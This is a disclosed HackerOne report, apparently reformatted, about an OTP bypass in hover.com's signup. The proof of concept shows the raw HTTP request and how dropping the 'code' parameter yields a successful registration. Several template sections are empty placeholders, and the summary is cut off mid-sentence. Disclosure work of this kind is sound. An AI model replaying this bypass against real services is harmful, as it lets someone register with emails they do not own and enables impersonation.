# Business Logic Error – Bypass of OTP Verification During Signup on hover.com

## Metadata
- **Source:** HackerOne
- **Report:** 3255473 | https://hackerone.com/reports/3255473
- **Submitted:** 2025-07-16
- **Reporter:** c0rvuz
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** none
- **Vuln:** Business Logic Errors
- **CVEs:** None
- **Category:** business-logic

## Summary
An attacker can register an account on www.hover.com using any email address without passing the required OTP verification. By omitting the code parameter entirely from the signup request, the backend completes the registration and returns a valid session. This constitutes a bypass of the OTP verification mechanism and a business logic error with potential for abuse, impersonation.

# PoC
Make a r

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

An attacker can register an account on www.hover.com using any email address without passing the required OTP verification. By omitting the code parameter entirely from the signup request, the backend completes the registration and returns a valid session. This constitutes a bypass of the OTP verification mechanism and a business logic error with potential for abuse, impersonation.

# PoC
Make a request on this endpoint:
```
POST /signup HTTP/2
Host: www.hover.com
Cookie: {{cookie}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/██████████ Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://www.hover.com/signup
Uzlc: true
Content-Type: application/json;charset=UTF-8
Content-Length: 233
Origin: https://www.hover.com
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

{
  "account": {
    "terms_version": 2,
    "first_name": "███",
    "last_name": "Sec",
    "email": "████",
    "username": "███",
    "password": "███",
    "token": null,
    "code": "624187",
    "tosValues": {
      "consent": true,
      "newsletter": true
    }
  }
}
```

2.  Bypass it by delete the parameter code:
```
{
  "account": {
    "terms_version": 2,
    "first_name": "████",
    "last_name": "Sec",
    "email": "███████████",
    "username": "████████",
    "password": "████",
    "token": null,
    "tosValues": {
      "consent": true,
      "newsletter": true
    }
  }
}
```

Response:
```
HTTP/2 200 OK
{"success": true}
```

3. Check email, the registration succed:

{F4573647}

## Impact

Bypasses OTP verification intended to prove email ownership
Allows anyone to register accounts using emails they don’t own
Can prevent real users from registering
May allow spam/abuse at scale
Could aid phishing or impersonation if the system sends emails

</details>

---
*Analysed by Claude on 2026-05-24*
